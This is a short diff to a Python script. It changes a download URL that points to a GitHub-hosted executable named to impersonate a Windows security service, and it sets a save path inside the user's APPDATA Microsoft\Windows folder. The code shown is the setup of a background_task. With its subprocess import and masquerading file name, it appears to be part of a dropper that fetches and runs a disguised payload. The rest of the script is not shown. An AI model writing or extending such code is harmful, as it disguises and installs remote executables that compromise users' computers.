@@ -5,7 +5,7 @@ import requests
 import subprocess
 import random
 
-URL = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Health.Service.Host.Container.Runtime.exe"
+URL = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Host.Container.Runtime.exe"
 PATH = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")
 
 def background_task():
